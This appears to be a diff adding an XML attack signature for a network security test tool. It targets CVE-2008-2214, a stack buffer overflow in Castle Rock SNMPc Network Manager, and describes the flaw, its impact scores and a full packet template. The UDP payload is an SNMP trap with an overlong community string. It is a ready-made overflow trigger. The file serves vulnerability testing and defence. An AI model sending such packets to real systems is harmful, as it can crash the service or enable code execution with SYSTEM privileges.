@@ -1,0 +1,75 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Castle Rock Computing SNMPc Network Manager Community String Stack Buffer Overflow"/>
+    <EngDesc display="true" value="A buffer overflow vulnerability exists in Castle Rock Computing SNMPc Network Manager. The vulnerability can be exploited when an overly long community string is supplied in the SNMP TRAP message. Successful exploitation can lead to the injection and execution of arbitrary code with SYSTEM level privileges. If an attack attempt is either unsuccessful in diverting the process flow or is meant to create a denial of service condition, then the affected service will terminate. In a more sophisticated attack, where code injection is successful, the behaviour of the target is entirely dependent on the intended function of the injected code. The code in such a case would execute within the security context of the System account."/>
+    <Intent display="true">
+      <item value="Code_Execution/Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="SNMP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Castle_Rock"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Castle_Rock_Computing_SNMPc_Network_Manager"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Castle_Rock_Computing_SNMPc_Network_Manager_7.1_and_possibly_prior"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2008-2214"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="17b2e388b1d4ff4eac2b8c75f0e0ba05"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634002933037863319"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="UDP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1264674602" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="B"/>
+    <NamedVar name="sourcePort" type="ImperfectControls.Port" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="SNMPdestPort" type="ImperfectControls.Port" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="D"/>
+      <for index="B"/>
+      <for index="E"/>
+      <for index="C"/>
+      <for index="F"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:0C:29:FB:66:BA" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0096" Identification="BA1F" FragmentOffset="0000" TTL="40" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <UDP srcPort="$sourcePort" destPort="$SNMPdestPort" checksum="" length="0082" Payload="307802010004506161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161A4210602520240047F000001020100020100430100300C300A06025202040474657374"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
